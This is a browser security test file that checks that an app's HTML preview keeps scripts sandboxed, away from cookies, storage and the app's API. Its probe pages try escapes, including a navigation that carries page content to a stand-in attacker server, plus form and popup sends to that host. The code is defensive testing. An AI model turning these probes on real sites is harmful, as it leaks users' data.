// #1084: an HTML file's script runs in the file viewer and in a new tab, but in
// an opaque origin that cannot reach the app. Proven in real Chrome, against
// the served app, because the guarantee is the browser's enforcement of the
// response's CSP `sandbox` directive and the iframe's `sandbox` attribute, not
// a header string. Each guard has a mutation receipt in the PR that added it.
//
// Two residual risks were accepted by the maintainer ruling on #1084 and are
// asserted here as documented behaviour: a sandboxed document can navigate
// itself anywhere, carrying what it can read, and a tab shows untrusted content
// under the app's host. A change to either is meant to be a reviewed diff.
import { afterAll, beforeAll, describe, expect, test } from "bun:test";
import { statSync } from "node:fs";
import { mkdir, mkdtemp, readFile, rm, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { resolve } from "node:path";
import { generateSignedCookie } from "hono/cookie";
import { chromium, type Browser, type BrowserContext, type Frame, type Page } from "playwright";
import { createApp, createRecordingObservability, createStaticBackendRegistry, resolveServerConfig } from "@schlessera/brain-ui-server";
import { createPrincipal } from "../../ui-server/src/db/principals.ts";
import { makeFakeBackend } from "../../ui-server/tests/helpers/fake-backend.ts";

const executablePath = [process.env.PUPPETEER_EXECUTABLE_PATH, process.env.BRAIN_UI_CHROME_PATH,
  "/usr/bin/google-chrome-stable", "/usr/bin/google-chrome", "/usr/bin/chromium", "/usr/bin/chromium-browser"]
  .find((path) => path && statSync(path, { throwIfNoEntry: false })?.isFile());
if (!executablePath && process.env.BRAIN_REQUIRE_CHROME === "1") throw new Error("HTML preview isolation proof requires real Chrome");
if (!executablePath) console.warn("SKIPPING HTML preview isolation proof: no Chrome; the sandbox is unverified locally.");

const repo = resolve(import.meta.dir, "../../..");
const SECRET = "html-preview-runtime-secret-0123456789";
const OWN_CONTENT = "Penelope weaves by day";

type Served = { origin: string; arrivals: string[]; stop: () => Promise<void> };
let fixture: string | undefined;
let browser: Browser | undefined;
let attacker: ReturnType<typeof Bun.serve> | undefined;
let attackerOrigin = "";
const attackerHits: string[] = [];
const served: Record<"password" | "none", Served | undefined> = { password: undefined, none: undefined };
let sessionCookie = "";

async function child(args: string[]): Promise<void> {
  const process = Bun.spawn(args, { cwd: repo, stdout: "pipe", stderr: "pipe", stdin: "ignore" });
  const [out, err, code] = await Promise.all([new Response(process.stdout).text(), new Response(process.stderr).text(), process.exited]);
  if (code !== 0) throw new Error(`HTML preview fixture preparation failed (${code}): ${out}\n${err}`);
}

/** Reports what the page's script could reach, into its own DOM. */
const REPORT = `<!doctype html><html lang="en"><head><title>Beacon report</title></head><body>
<h1 id="ran">Script did not run</h1><pre id="report"></pre>
<script>
(async () => {
  const ctx = window.parent !== window ? "frame" : "tab";
  document.getElementById("ran").textContent = "Script ran in the " + ctx;
  const r = { ctx, violations: [] };
  document.addEventListener("securitypolicyviolation", (e) => r.violations.push(e.effectiveDirective));
  r.origin = window.origin;
  try { r.cookie = document.cookie; } catch (e) { r.cookie = "threw:" + e.name; }
  try { r.localStorage = String(localStorage.getItem("bk_canary")); } catch (e) { r.localStorage = "threw:" + e.name; }
  try { r.parentTitle = window.parent.document.title; } catch (e) { r.parentTitle = "threw:" + e.name; }
  const attempt = (p) => p.then((res) => "ok:" + res.status, (e) => "threw:" + e.name);
  r.fetchCors = await attempt(fetch("/api/files/tree?probe=" + ctx + "-cors"));
  r.fetchNoCors = await attempt(fetch("/api/files/tree?probe=" + ctx + "-nocors", { mode: "no-cors", credentials: "include" }));
  r.fetchPost = await attempt(fetch("/api/vpn-check?probe=" + ctx + "-post", { method: "POST", mode: "no-cors", body: "x" }));
  r.xhr = await new Promise((done) => { const x = new XMLHttpRequest(); x.onload = () => done("ok:" + x.status); x.onerror = () => done("error");
    try { x.open("GET", "/api/files/tree?probe=" + ctx + "-xhr"); x.send(); } catch (e) { done("threw:" + e.name); } });
  r.ws = await new Promise((done) => { try { const s = new WebSocket("ws://" + location.host + "/ws?probe=" + ctx + "-ws");
    s.onopen = () => done("open"); s.onerror = () => done("error"); } catch (e) { done("threw:" + e.name); } });
  try { navigator.sendBeacon("/api/files/tree?probe=" + ctx + "-beacon"); } catch (e) {}
  r.image = await new Promise((done) => { const i = new Image(); i.onload = () => done("load"); i.onerror = () => done("error");
    i.src = "/api/files/tree?probe=" + ctx + "-img"; });
  // Violation events are queued apart from the failures above, so a fixed
  // pause can report before they arrive (#1108). Wait for the two the probe
  // provokes, within a bound; whatever has arrived by then is reported.
  const until = Date.now() + 10000;
  while (!["connect-src", "img-src"].every((d) => r.violations.includes(d)) && Date.now() < until) {
    await new Promise((done) => setTimeout(done, 25));
  }
  r.violations = [...new Set(r.violations)].sort();
  document.getElementById("report").textContent = JSON.stringify(r);
})();
</script></body></html>`;

/**
 * A page with one button, #go, that attempts one escape on a click. It marks
 * its root when the pointer reaches it and when the click lands, before the
 * escape, so the test can prove the attempt was made (#1108).
 */
const escapePage = (action: string, body = "") => `<!doctype html><html lang="en"><head><title>Escape probe</title></head><body>
<p id="secret">${OWN_CONTENT}</p>${body}<button id="go" type="button">Go</button>
<script>
const ctx = window.parent !== window ? "frame" : "tab";
const A = ${JSON.stringify("ATTACKER")};
document.addEventListener("pointermove", () => { document.documentElement.dataset.pointer = "in"; });
document.getElementById("go").addEventListener("click", () => { document.documentElement.dataset.clicked = ctx; ${action} });
document.title = "Escape probe ready";
</script></body></html>`;

const PAGES: Record<string, string> = {
  "voyage/report.html": REPORT,
  "voyage/popup.html": escapePage(`window.open(A + "/popup?ctx=" + ctx);`),
  "voyage/form.html": escapePage(`document.getElementById("f").submit();`,
    `<form id="f" action="ATTACKER/form" method="get"><input name="ctx" value="probe"></form>`),
  "voyage/download.html": escapePage(`document.getElementById("d").click();`,
    `<a id="d" download="ithaca.txt" href="data:text/plain,ithaca">file</a>`),
  "voyage/top.html": escapePage(`window.top.location.href = A + "/top?ctx=" + ctx;`),
  "voyage/navigate.html": escapePage(
    `location.href = A + "/nav?ctx=" + ctx + "&leak=" + encodeURIComponent(document.getElementById("secret").textContent);`),
};

async function serve(mode: "password" | "none", brain: string, assets: string): Promise<Served> {
  const backend = makeFakeBackend({ id: `html-preview-${mode}` });
  const app = await createApp({
    config: resolveServerConfig({
      BRAIN_PATH: brain, DB_PATH: resolve(fixture!, `${mode}.db`), AUTH_MODE: mode, HOST: "127.0.0.1", NODE_ENV: "test",
      BRAIN_UI_PRICING_DISCOVERY: "0", BRAIN_UI_MODEL_DISCOVERY: "0",
      ...(mode === "password" ? { BRAIN_UI_PASSWORD_HASH: "unused-fixture-hash", COOKIE_SECRET: SECRET } : {}),
    }),
    registry: createStaticBackendRegistry([backend], backend.id), staticRoot: assets, observability: createRecordingObservability(),
  });
  if (mode === "password") {
    const principal = createPrincipal(app.db, { authMethod: "password", label: "Penelope", ttlSeconds: 3600 });
    sessionCookie = (await generateSignedCookie("brain_ui_session", principal.id, SECRET)).split(";")[0]!.split("=").slice(1).join("=");
  }
  const arrivals: string[] = [];
  const server = Bun.serve({
    hostname: "127.0.0.1", port: 0, websocket: app.websocket,
    fetch: (request, srv) => {
      const probe = new URL(request.url).searchParams.get("probe");
      if (probe) arrivals.push(probe);
      return app.fetch(request, srv as never);
    },
  });
  return { origin: `http://127.0.0.1:${server.port}`, arrivals, stop: async () => { server.stop(true); await app.close(); } };
}

beforeAll(async () => {
  if (!executablePath) return;
  // The client bundle uses fresh source plus ordinary package resolution.
  await child([process.execPath, "scripts/build.ts"]);
  fixture = await mkdtemp(resolve(tmpdir(), "odysseus-html-preview-"));
  attacker = Bun.serve({ hostname: "127.0.0.1", port: 0, fetch: (request) => {
    const url = new URL(request.url);
    attackerHits.push(url.pathname + url.search);
    return new Response("<!doctype html><title>Elsewhere</title>", { headers: { "content-type": "text/html" } });
  } });
  attackerOrigin = `http://127.0.0.1:${attacker.port}`;
  const brain = resolve(fixture, "brain");
  await mkdir(resolve(brain, "voyage"), { recursive: true });
  for (const [path, html] of Object.entries(PAGES)) await writeFile(resolve(brain, path), html.replaceAll("ATTACKER", attackerOrigin));
  const assets = resolve(fixture, "assets");
  await mkdir(assets);
  await child([process.execPath, "-e", 'const r=await Bun.build({entrypoints:[process.argv[1]],target:"browser",outdir:process.argv[2],naming:"client.js"});if(!r.success){console.error(r.logs);process.exit(1)}', resolve(import.meta.dir, "fixtures/html-preview-client.tsx"), assets]);
  await writeFile(resolve(assets, "index.html"), '<!doctype html><html lang="en"><head><meta name="viewport" content="width=device-width"><title>Odysseus file viewer</title><link rel="stylesheet" href="/kit.css"><link rel="stylesheet" href="/app.css"><style>body{margin:0;background:var(--bk-color-canvas);color:var(--bk-color-ink)}section[aria-label="File viewer"]{height:700px;min-width:0}</style></head><body><div id="app"></div><script type="module" src="/client.js"></script></body></html>');
  for (const [name, pkg] of [["kit.css", "ui-kit"], ["app.css", "ui-react"]]) {
    await writeFile(resolve(assets, name!), await readFile(resolve(repo, `packages/${pkg}/dist/styles.css`)));
  }
  served.password = await serve("password", brain, assets);
  served.none = await serve("none", brain, assets);
  browser = await chromium.launch({ executablePath, headless: true, args: ["--no-sandbox", "--disable-dev-shm-usage"] });
}, 240_000);

afterAll(async () => {
  await browser?.close();
  await served.password?.stop();
  await served.none?.stop();
  attacker?.stop(true);
  if (fixture) await rm(fixture, { recursive: true, force: true });
});

type Opened = { page: Page; context: BrowserContext; app: Served; outside: string[]; downloads: string[] };

/** The real viewer on one file. Only the app and the stand-in attacker are reachable. */
async function openViewer(mode: "password" | "none", file: string, theme = "dark", width = 1280): Promise<Opened> {
  const app = served[mode]!;
  const context = await browser!.newContext({ viewport: { width, height: 900 }, acceptDownloads: true });
  const host = new URL(app.origin).hostname;
  // The canary is readable by script at the app's origin; the session cookie,
  // like the real one, is HttpOnly and SameSite=Strict.
  await context.addCookies([
    { name: "bk_canary", value: "ithaca", domain: host, path: "/", sameSite: "Strict" },
    ...(mode === "password" ? [{ name: "brain_ui_session", value: sessionCookie, domain: host, path: "/", httpOnly: true, sameSite: "Strict" as const }] : []),
  ]);
  const outside: string[] = [];
  await context.route("**/*", (route) => {
    const url = route.request().url();
    const origin = new URL(url).origin;
    if (origin === app.origin || origin === attackerOrigin || url.startsWith("data:")) return route.continue();
    outside.push(url);
    return route.abort();
  });
  const downloads: string[] = [];
  context.on("page", (page) => page.on("download", (download) => downloads.push(download.suggestedFilename())));
  const page = await context.newPage();
  await page.goto(`${app.origin}/?${new URLSearchParams({ file, theme })}`);
  await page.waitForFunction("window.__htmlPreviewFixture?.state().kind === 'html'");
  return { page, context, app, outside, downloads };
}

async function previewFrame(page: Page): Promise<Frame> {
  const handle = await page.waitForSelector('iframe[title="HTML preview"]');
  const frame = await handle.contentFrame();
  if (!frame) throw new Error("HTML preview iframe has no frame");
  await frame.waitForLoadState("load");
  return frame;
}

async function openInTab(opened: Opened): Promise<Page> {
  const [tab] = await Promise.all([
    opened.context.waitForEvent("page"),
    opened.page.getByRole("link", { name: "Open in new tab" }).click(),
  ]);
  await tab.waitForLoadState("load");
  return tab;
}

async function report(target: Page | Frame): Promise<Record<string, unknown>> {
  await target.waitForFunction(() => document.getElementById("report")?.textContent !== "", undefined, { timeout: 15_000 });
  return JSON.parse((await target.locator("#report").textContent())!);
}

/** What the probe must find in an opaque origin, whatever the context. */
function expectIsolated(r: Record<string, unknown>): void {
  expect(r.origin).toBe("null");
  // First behavioural assertion for a lost sandbox: the canary becomes readable.
  expect(String(r.localStorage)).toStartWith("threw:");
  expect(r.cookie === "" || String(r.cookie).startsWith("threw:")).toBe(true);
  expect(r.fetchCors).toBe("threw:TypeError");
  expect(r.fetchNoCors).toBe("threw:TypeError");
  expect(r.fetchPost).toBe("threw:TypeError");
  expect(r.xhr).toBe("error");
  expect(r.ws).toBe("error");
  expect(r.image).toBe("error");
  expect(r.violations).toEqual(["connect-src", "img-src"]);
}

/**
 * The fixed window in which a negative assertion watches for an escape that
 * must not arrive. It starts only once the click is known to have landed.
 */
const settle = (page: Page | Frame) => page.waitForTimeout(1500);

/** Poll until `condition` holds, failing with `what` after a bounded deadline. */
async function until(what: string, condition: () => boolean | Promise<boolean>, timeout = 15_000): Promise<void> {
  const deadline = Date.now() + timeout;
  while (!(await condition())) {
    if (Date.now() > deadline) throw new Error(`Timed out after ${timeout} ms waiting until ${what}`);
    await Bun.sleep(25);
  }
}

/** A mark the escape probe set on its root, or "" (also while it navigates). */
const mark = (target: Page | Frame, name: "pointer" | "clicked") =>
  target.evaluate((key) => document.documentElement.dataset[key] ?? "", name).catch(() => "");

describe.skipIf(!executablePath)("the interactive HTML preview runs scripts in an opaque origin", () => {
  for (const mode of ["password", "none"] as const) for (const [theme, width] of [["dark", 320], ["light", 1280]] as const) {
    test(`iframe preview and new tab are isolated (${mode} auth, ${theme}, ${width}px)`, async () => {
      const opened = await openViewer(mode, "voyage/report.html", theme, width);
      try {
        const { page, app } = opened;
        // The app page itself can read the canaries: the probe would see them
        // if it shared the app's origin.
        expect(await page.evaluate(() => [document.cookie, localStorage.getItem("bk_canary"), window.origin])).toEqual(["bk_canary=ithaca", "ithaca", app.origin]);
        const frame = await previewFrame(page);
        expect(await frame.locator("#ran").textContent()).toBe("Script ran in the frame");
        const framed = await report(frame);
        expect(framed.ctx).toBe("frame");
        expectIsolated(framed);
        expect(framed.parentTitle).toBe("threw:SecurityError");

        const tab = await openInTab(opened);
        expect(tab.url()).toBe(`${app.origin}/api/files/html?path=voyage%2Freport.html`);
        expect(await tab.locator("#ran").textContent()).toBe("Script ran in the tab");
        const tabbed = await report(tab);
        expect(tabbed.ctx).toBe("tab");
        expectIsolated(tabbed);

        // Nothing the page tried reached the server: the browser stopped it, so
        // this holds in auth modes where the server would have authorized it.
        expect(app.arrivals).toEqual([]);
        expect(opened.outside).toEqual([]);
      } finally { await opened.context.close(); served[mode]!.arrivals.length = 0; }
    }, 60_000);
  }

  test("control: in the none auth mode the server would answer the same request", async () => {
    const response = await fetch(`${served.none!.origin}/api/files/tree?probe=control`);
    expect(response.status).toBe(200);
    expect(served.none!.arrivals).toEqual(["control"]);
    served.none!.arrivals.length = 0;
  });

  /**
   * Click #go in the preview iframe, then (if the app is still where it was)
   * in the new tab; return what escaped. A frame that took over the app's
   * window leaves no link to open a tab from, so the tab half is skipped and
   * the caller's first assertion reports the escape itself.
   *
   * The preview is an out-of-process frame, and Chrome can route a click that
   * comes too soon after it loads to the app's <iframe> element instead. The
   * page never sees it, and every negative assertion passes vacuously (#1108).
   * So the frame must first report the pointer, and each click must then be
   * seen to land, or to have navigated something, before its window starts.
   * An expected hit is awaited rather than assumed to fit in the window.
   */
  async function attempt(file: string, expected: { frame?: string; tab?: string } = {}) {
    const opened = await openViewer("password", file);
    const before = attackerHits.length;
    const hits = () => attackerHits.slice(before);
    try {
      const appUrl = opened.page.url();
      const frame = await previewFrame(opened.page);
      const frameUrl = frame.url();
      await frame.waitForFunction(() => document.title === "Escape probe ready");
      let nudge = 0;
      await until("the preview frame receives pointer events", async () => {
        await frame.locator("#go").hover({ position: { x: 4 + (nudge++ % 8), y: 4 } });
        return (await mark(frame, "pointer")) === "in";
      });
      const pagesBefore = opened.context.pages().length;
      await frame.locator("#go").click({ noWaitAfter: true });
      await until("the click lands in the preview frame", async () =>
        (await mark(frame, "clicked")) === "frame" || frame.isDetached() || frame.url() !== frameUrl || opened.page.url() !== appUrl);
      if (expected.frame) await until(`the attacker records ${expected.frame}`, () => hits().includes(expected.frame!));
      await settle(opened.page);
      const result = {
        opened,
        appUrlAfterFrame: opened.page.url(),
        framePopups: opened.context.pages().length - pagesBefore,
        frameDownloads: opened.downloads.length,
        tabPopups: -1, tabDownloads: -1, tabUrl: "",
        hits: [] as string[],
      };
      if (result.appUrlAfterFrame === appUrl) {
        const tab = await openInTab(opened);
        const tabUrl = tab.url();
        await tab.waitForFunction(() => document.title === "Escape probe ready");
        const tabPagesBefore = opened.context.pages().length;
        await tab.locator("#go").click({ noWaitAfter: true });
        await until("the click lands in the tab", async () => (await mark(tab, "clicked")) === "tab" || tab.url() !== tabUrl);
        if (expected.tab) await until(`the attacker records ${expected.tab}`, () => hits().includes(expected.tab!));
        await settle(tab);
        result.tabPopups = opened.context.pages().length - tabPagesBefore;
        result.tabDownloads = opened.downloads.length - result.frameDownloads;
        result.tabUrl = tab.url();
      }
      result.hits = hits();
      return result;
    } catch (error) { await opened.context.close(); throw error; }
  }

  test("window.open is blocked in both contexts", async () => {
    const r = await attempt("voyage/popup.html");
    try {
      expect(r.hits).toEqual([]);
      expect(r.framePopups).toBe(0);
      expect(r.tabPopups).toBe(0);
    } finally { await r.opened.context.close(); }
  }, 60_000);

  test("form submission is blocked in both contexts", async () => {
    const r = await attempt("voyage/form.html");
    try {
      expect(r.hits).toEqual([]);
      expect(r.tabUrl).toContain("/api/files/html?path=voyage%2Fform.html");
    } finally { await r.opened.context.close(); }
  }, 60_000);

  test("downloads are blocked in both contexts", async () => {
    const r = await attempt("voyage/download.html");
    try {
      expect(r.frameDownloads).toBe(0);
      expect(r.tabDownloads).toBe(0);
    } finally { await r.opened.context.close(); }
  }, 60_000);

  test("the preview cannot navigate the app's window", async () => {
    const r = await attempt("voyage/top.html", { tab: "/top?ctx=tab" });
    try {
      expect(r.appUrlAfterFrame).toStartWith(`${served.password!.origin}/?`);
      expect(r.hits.filter((hit) => hit.includes("ctx=frame"))).toEqual([]);
      // In the tab, the page *is* the top window, so this is self-navigation:
      // the accepted risk asserted below.
      expect(r.hits).toEqual(["/top?ctx=tab"]);
    } finally { await r.opened.context.close(); }
  }, 60_000);

  test("accepted risk (#1084 ruling): self-navigation carries the page's own content to any URL", async () => {
    const leak = `leak=${encodeURIComponent(OWN_CONTENT)}`;
    const r = await attempt("voyage/navigate.html", { frame: `/nav?ctx=frame&${leak}`, tab: `/nav?ctx=tab&${leak}` });
    try {
      expect(r.hits).toEqual([`/nav?ctx=frame&${leak}`, `/nav?ctx=tab&${leak}`]);
      // The app itself stays where it was; only the frame navigated.
      expect(r.appUrlAfterFrame).toStartWith(`${served.password!.origin}/?`);
      expect(r.tabUrl).toStartWith(`${attackerOrigin}/nav?ctx=tab`);
    } finally { await r.opened.context.close(); }
  }, 60_000);

  test("accepted risk (#1084 ruling): the new tab shows untrusted content under the app's host", async () => {
    const opened = await openViewer("password", "voyage/report.html");
    try {
      const tab = await openInTab(opened);
      expect(new URL(tab.url()).origin).toBe(served.password!.origin);
      expect(await tab.evaluate(() => window.origin)).toBe("null");
    } finally { await opened.context.close(); }
  }, 60_000);

  test("the non-interactive raw route still runs no script", async () => {
    const opened = await openViewer("password", "voyage/report.html");
    try {
      const raw = await opened.context.newPage();
      await raw.goto(`${served.password!.origin}/api/files/content?path=voyage%2Freport.html&raw=1`);
      await raw.waitForTimeout(500);
      expect(await raw.locator("#ran").textContent()).toBe("Script did not run");
    } finally { await opened.context.close(); }
  }, 60_000);
});
